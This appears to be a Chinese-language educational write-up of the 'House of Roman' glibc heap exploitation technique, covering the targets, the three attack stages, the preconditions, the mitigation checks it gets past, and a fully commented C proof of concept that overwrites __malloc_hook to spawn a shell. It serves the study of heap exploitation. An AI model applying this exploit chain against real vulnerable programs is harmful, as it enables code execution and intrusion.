# House of Roman漏洞利用文档

## 攻击对象
- **主要目标**：`__malloc_hook`全局函数指针（地址示例：`0x7ffff7bcdb10`）。这是glibc中的一个钩子变量，当malloc被调用时，如果`__malloc_hook`非空，会执行其指向的函数。
- **次要目标**：
  - Fastbin的fd指针（例如chunk在`0x603010`处的fd指针），通过修改fd指针来操纵fastbin链。
  - Unsorted bin的bk指针（例如chunk在`0x603208`处的bk指针），用于unsorted bin攻击。
  - 伪造的chunk大小字段（例如在`0x7ffff7bcdaed`处的0x7f值），用于绕过fastbin size检查。
- **特定结构体**：攻击利用main_arena结构中的bin链表指针（如`main_arena+88`用于unsorted bin），通过相对覆盖修改这些指针。

## 利用过程
1. **第一阶段（Fastbin指向__malloc_hook）**：
   - 通过堆风水布局，创建多个chunk并释放特定chunk到fastbin和unsorted bin。
   - 利用UAF修改fastbin victim chunk的fd指针，使其指向一个包含libc地址的chunk（fake_libc_chunk）。
   - 相对覆盖fake_libc_chunk的fd指针，使其指向`__malloc_hook - 0x23`（伪造一个fastbin chunk）。
   - 分配chunk以推进fastbin链，最终分配一个指向`__malloc_hook`附近的chunk，获得写权限。

2. **第二阶段（Unsorted Bin攻击）**：
   - 分配一个chunk并释放到unsorted bin，修改其bk指针指向`__malloc_hook - 0x10`。
   - 触发unsorted bin攻击，将`main_arena+88`的值写入`__malloc_hook`。

3. **第三阶段（控制流劫持）**：
   - 通过相对覆盖，修改`__malloc_hook`的值（从`main_arena+88`改为system函数地址）。
   - 调用malloc触发`system("/bin/sh")`，获得shell权限。

整个利用过程依赖相对覆盖和堆风水，绕过ASLR，无需信息泄露。

## 利用条件
- **UAF（Use-After-Free）**：程序允许在free后修改chunk的fd或bk指针（例如，源码中通过`fastbin_victim[0] = 0x00`修改已释放chunk的内存）。
- **堆溢出或类似能力**：虽然源码中未直接显示堆溢出，但需要能够部分覆盖指针字节（相对覆盖），模拟了溢出或UAF的效果。
- **堆布局控制**：能够精确控制堆的分配和释放顺序，以创建所需的chunk布局（堆风水）。
- **暴力破解**：需要绕过12位ASLR随机性（约1/4096成功率），通过相对覆盖低字节实现。

## 利用效果
- **控制流劫持**：通过修改`__malloc_hook`，劫持malloc调用，执行任意代码（本例中为system函数）。
- **任意代码执行**：最终获得shell权限，实现远程代码执行。
- **内存破坏**：利用过程中损坏堆元数据（如fastbin和unsorted bin链表），但攻击完成后不影响shell获取。

## 涉及缓解机制
攻击利用了glibc堆管理器的以下特性，并绕过相关检查：

### Fastbin Size检查
在malloc从fastbin分配chunk时，会验证chunk的size字段是否匹配bin的大小。glibc源码中的相关代码（类似以下伪代码）：
```c
// 在malloc.c中，fastbin分配时检查size
if (__glibc_unlikely (chunksize (victim) != nb)) {
    errstr = "malloc(): memory corruption (fast)";
    goto errout;
}
```
在攻击中，伪造的chunk在`__malloc_hook - 0x23`处，该位置有0x7f的字节（由于内存对齐），被解释为size字段，匹配0x70 fastbin的大小，从而通过检查。

### Unsorted Bin攻击的Unlink检查
Unsorted bin攻击利用unlink操作写入main_arena地址，但现代glibc有unlink检查。然而，此攻击针对bk指针修改，写入发生在bk + 0x10处，不直接触发unlink检查。unlink的伪代码：
```c
#define unlink(AV, P, BK, FD) { \
    FD = P->fd; \
    BK = P->bk; \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \
      malloc_printerr ("corrupted double-linked list"); \
    else { \
      FD->bk = BK; \
      BK->fd = FD; \
    } \
}
```
但unsorted bin攻击在分配过程中写入bk + 0x10，而非直接unlink，因此可能绕过检查（取决于glibc版本）。在本攻击中，通过修改bk指针，触发写入。

### ASLR绕过
通过相对覆盖指针的低字节（12位暴力破解），部分绕过ASLR，无需泄漏地址。

## Proof of Concept
以下是漏洞利用原型源码的关键部分添加中文注释，展示利用过程：

```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>

char* shell = "/bin/sh\x00";

void* init(){
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
}

int main(){
	init(); // 初始化，关闭缓冲以避免堆对齐问题

	// 步骤1: 分配初始chunk用于堆风水
	uint8_t* fastbin_victim = malloc(0x60); // 用于后续UAF修改的chunk，大小0x60（实际chunk大小0x70）
	malloc(0x80); // 对齐填充chunk，避免合并或对齐问题
	uint8_t* main_arena_use = malloc(0x80); // 将被释放到unsorted bin的chunk
	uint8_t* relative_offset_heap = malloc(0x60); // 用于相对偏移的chunk

	free(main_arena_use); // 释放到unsorted bin，使其fd/bk指向main_arena+88

	// 从unsorted bin分配一个chunk，其fd/bk包含main_arena指针
	uint8_t* fake_libc_chunk = malloc(0x60); // 现在fake_libc_chunk的fd/bk指向main_arena

	// 计算__malloc_hook地址（实际攻击中可能需要暴力破解偏移）
	long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8; // 通过main_arena指针推算__malloc_hook地址

	free(relative_offset_heap); // 释放到fastbin，为fastbin链做准备
	free(fastbin_victim); // 释放到fastbin，创建UAF条件，现在fastbin链为fastbin_victim -> relative_offset_heap

	// 相对覆盖：修改fastbin_victim的fd指针的低字节，指向fake_libc_chunk
	fastbin_victim[0] = 0x00; // 覆盖低字节，将指针从0x603190改为0x603100（指向fake_libc_chunk）

	// 计算__malloc_hook调整地址，用于伪造fastbin chunk
	long long __malloc_hook_adjust = __malloc_hook - 0x23; // 减去0x23以使得伪造chunk的size字段为0x7f
	// 相对覆盖fake_libc_chunk的fd指针，指向__malloc_hook附近
	fake_libc_chunk[0] = __malloc_hook_adjust & 0xff; // 写入低字节
	fake_libc_chunk[1] = (__malloc_hook_adjust >> 8) & 0xff; // 写入次低字节（需要暴力破解4位）

	// 分配chunk，使fastbin链前进：首先分配fastbin_victim，然后分配fake_libc_chunk
	malloc(0x60); // 分配fastbin_victim chunk
	malloc(0x60); // 分配fake_libc_chunk chunk
	uint8_t* malloc_hook_chunk = malloc(0x60); // 现在分配指向__malloc_hook附近的chunk，获得写权限

	// 步骤2: unsorted bin攻击
	uint8_t* unsorted_bin_ptr = malloc(0x80); // 分配一个chunk用于unsorted bin攻击
	malloc(0x30); // 分配一个小chunk防止合并
	free(unsorted_bin_ptr); // 释放到unsorted bin，使其fd/bk指向main_arena+88

	// 修改unsorted_bin_ptr的bk指针，指向__malloc_hook - 0x10（unsorted bin攻击写入目标）
	__malloc_hook_adjust = __malloc_hook - 0x10; // 调整地址，因为unsorted bin攻击写入bk + 0x10
	unsorted_bin_ptr[8] = __malloc_hook_adjust & 0xff; // bk指针的低字节
	unsorted_bin_ptr[9] = (__malloc_hook_adjust >> 8) & 0xff; // bk指针的次低字节（需要暴力破解）

	// 触发unsorted bin攻击：分配相同大小的chunk，导致main_arena+88写入__malloc_hook
	malloc(0x80); // 这会将main_arena+88写入__malloc_hook

	// 步骤3: 相对覆盖__malloc_hook值为system地址
	long long system_addr = (long long)dlsym(RTLD_NEXT, "system"); // 获取system函数地址（实际攻击中可能用one_gadget）
	// 通过控制的内存（malloc_hook_chunk）修改__malloc_hook的值
	malloc_hook_chunk[19] = system_addr & 0xff; // 覆盖低字节
	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff; // 覆盖次低字节
	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff; // 覆盖中字节
	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // 覆盖高字节（需要暴力破解8位）

	// 触发malloc，由于__malloc_hook指向system，实际调用system("/bin/sh")
	malloc((long long)shell); // 参数为shell字符串地址，执行shell
}
```

此PoC展示了完整的利用链，关键注释解释了每个步骤的目的和操作。攻击成功依赖于堆布局和相对覆盖，最终实现无信息泄露的代码执行。